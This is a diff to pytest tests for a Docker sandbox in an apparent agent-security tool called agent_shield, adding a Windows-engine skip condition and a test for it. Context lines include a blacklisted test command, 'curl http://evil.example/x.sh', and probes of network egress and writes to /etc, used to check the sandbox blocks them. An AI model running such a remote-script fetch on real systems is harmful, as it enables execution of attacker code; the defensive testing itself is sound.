@@ -35,7 +35,13 @@ def test_run_command_tool_wires_local_backend():
     assert type(tool.executor) is SandboxExecutor
 
 
-@pytest.mark.skipif(not docker_available(), reason="本机无可用 Docker daemon")
+_NEED_LINUX_DOCKER = pytest.mark.skipif(
+    not docker_available(),
+    reason="需要 Linux 容器引擎（Windows containers 不支持 --read-only/alpine）",
+)
+
+
+@_NEED_LINUX_DOCKER
 def test_docker_sandbox_runs_echo():
     exe = DockerSandboxExecutor()
     result = exe.run("echo docker-sandbox-ok", sandbox=True)
@@ -43,7 +49,7 @@ def test_docker_sandbox_runs_echo():
     assert "docker-sandbox-ok" in result.stdout
 
 
-@pytest.mark.skipif(not docker_available(), reason="本机无可用 Docker daemon")
+@_NEED_LINUX_DOCKER
 def test_docker_sandbox_still_denies_blacklist():
     exe = DockerSandboxExecutor()
     result = exe.run("curl http://evil.example/x.sh", sandbox=True)
@@ -51,7 +57,7 @@ def test_docker_sandbox_still_denies_blacklist():
     assert result.returncode == -2
 
 
-@pytest.mark.skipif(not docker_available(), reason="本机无可用 Docker daemon")
+@_NEED_LINUX_DOCKER
 def test_docker_sandbox_network_none_blocks_egress():
     """不在黑名单的出网探针：``--network=none`` 应使 DNS/连通失败。
 
@@ -64,7 +70,7 @@ def test_docker_sandbox_network_none_blocks_egress():
     assert not result.ok
 
 
-@pytest.mark.skipif(not docker_available(), reason="本机无可用 Docker daemon")
+@_NEED_LINUX_DOCKER
 def test_docker_sandbox_readonly_root_blocks_host_escape_write():
     """只读根 + tmpfs：往 ``/etc`` 写入应失败（容器内隔离，非宿主写）。"""
     exe = DockerSandboxExecutor()
@@ -72,11 +78,27 @@ def test_docker_sandbox_readonly_root_blocks_host_escape_write():
     assert not result.ok
 
 
-@pytest.mark.skipif(not docker_available(), reason="本机无可用 Docker daemon")
+@_NEED_LINUX_DOCKER
 def test_build_auto_prefers_docker_when_available(monkeypatch):
     monkeypatch.setenv("AGENT_SHIELD_SANDBOX", "auto")
     exe = build_sandbox_executor("auto")
     assert isinstance(exe, DockerSandboxExecutor)
+
+
+def test_docker_available_rejects_windows_container_engine(monkeypatch):
+    """GHA windows-latest：daemon 可达但 OSType=windows → 不可用（避免 --read-only 炸）。"""
+    import agent_shield.defenses.docker_sandbox as mod
+
+    monkeypatch.setattr(mod, "_DOCKER_AVAILABLE_CACHE", None)
+    monkeypatch.setattr(mod.shutil, "which", lambda _cmd: "docker")
+
+    class _Proc:
+        returncode = 0
+        stdout = "windows\n"
+        stderr = ""
+
+    monkeypatch.setattr(mod.subprocess, "run", lambda *a, **k: _Proc())
+    assert mod.docker_available(force_refresh=True) is False
 
 
 def test_build_auto_falls_back_without_docker(monkeypatch):
